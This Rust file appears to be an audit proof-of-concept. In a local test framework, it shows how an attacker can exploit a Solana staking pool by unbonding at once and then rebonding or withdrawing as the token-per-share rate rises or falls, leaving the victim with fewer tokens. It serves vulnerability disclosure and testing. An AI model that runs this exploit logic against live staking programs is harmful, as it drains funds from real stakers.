mod framework;
use anchor_spl::associated_token::get_associated_token_address;
use framework::{clone_keypair, get_balance, Framework};
use std::error::Error;

use poc_framework_osec::{solana_sdk::signer::Signer, Environment};

fn main() -> Result<(), Box<dyn Error>> {
    hedge_rate_increase()?;
    hedge_rate_decrease()?;

    Ok(())
}

// hedging risk by unbonding immediately and rebonding if tokens/share increased, or withdraw unbonded if tokens/share decreased
fn hedge_rate_increase() -> Result<(), Box<dyn Error>> {
    println!();
    println!("hedge rate increase");
    let mut test_env = Framework::new()?;
    let attacker = clone_keypair(&test_env.attacker);
    let victim = clone_keypair(&test_env.victim);

    // setup
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.create_user_auth(&victim)?;
    test_env.authenticate_user(&attacker)?;
    test_env.authenticate_user(&victim)?;
    test_env.init_stake_account(&attacker)?;
    test_env.init_stake_account(&victim)?;

    // give victim and attacker 100 tokens
    test_env.mint_vault_token(&attacker, 100)?;
    test_env.mint_vault_token(&victim, 100)?;

    // stake the tokens
    test_env.add_stake(&attacker, 100)?;
    test_env.add_stake(&victim, 100)?;

    // unbond tokens
    test_env.unbond_stake_shares(&attacker, 0, 100)?;
    // double tokens in the pool to incrase tokens/share
    test_env.env.mint_tokens(
        test_env.vault_token_mint.pubkey(),
        &test_env.pool_authority,
        test_env.stake_pool_vault_pubkey(),
        200,
    );
    // rebond
    test_env.cancel_unbond(&attacker, 0)?;
    // unbond fully this time
    test_env.unbond_stake_shares(&attacker, 1, 100)?;
    test_env.withdraw_unbonded_stake(&attacker, 1)?;
    // also withdraw from victim
    test_env.unbond_stake_shares(&victim, 0, 100)?;
    test_env.withdraw_unbonded_stake(&victim, 0)?;

    let attacker_bal = get_balance(&test_env, &attacker, &test_env.vault_token_mint.pubkey())?;
    let victim_bal = get_balance(&test_env, &victim, &test_env.vault_token_mint.pubkey())?;
    println!("final attacker token bal: {}", attacker_bal);
    println!("final victim token bal: {}", victim_bal);

    Ok(())
}

fn hedge_rate_decrease() -> Result<(), Box<dyn Error>> {
    println!();
    println!("hedge rate decrease");

    let mut test_env = Framework::new()?;
    let attacker = clone_keypair(&test_env.attacker);
    let victim = clone_keypair(&test_env.victim);

    // setup
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.create_user_auth(&victim)?;
    test_env.authenticate_user(&attacker)?;
    test_env.authenticate_user(&victim)?;
    test_env.init_stake_account(&attacker)?;
    test_env.init_stake_account(&victim)?;

    // give victim and attacker 100 tokens
    test_env.mint_vault_token(&attacker, 100)?;
    test_env.mint_vault_token(&victim, 100)?;

    // stake the tokens
    test_env.add_stake(&attacker, 100)?;
    test_env.add_stake(&victim, 100)?;

    // unbond tokens
    test_env.unbond_stake_shares(&attacker, 0, 100)?;

    // reduce tokens/share
    test_env.withdraw_bonded(&victim, 100)?;
    // burn the tokens
    Framework::process_tx_result(test_env.env.execute_as_transaction(
        &*vec![spl_token::instruction::burn(
            &spl_token::id(),
            &get_associated_token_address(&victim.pubkey(), &test_env.vault_token_mint.pubkey()),
            &test_env.vault_token_mint.pubkey(),
            &victim.pubkey(),
            &*vec![&victim.pubkey(), &test_env.pool_authority.pubkey()],
            100,
        )?],
        &*vec![&victim, &test_env.pool_authority],
    ));

    // withdraw unbonded
    test_env.withdraw_unbonded_stake(&attacker, 0)?;

    // attempt to withdraw stake as victim
    test_env.unbond_stake_shares(&victim, 0, 100)?;
    println!("should not be enough tokens for victim to withdraw");
    test_env.withdraw_unbonded_stake(&victim, 0)?;

    let attacker_bal = get_balance(&test_env, &attacker, &test_env.vault_token_mint.pubkey())?;
    let victim_bal = get_balance(&test_env, &victim, &test_env.vault_token_mint.pubkey())?;

    println!();
    println!("final attacker token bal: {}", attacker_bal);
    println!("final victim token bal: {}", victim_bal);

    Ok(())
}
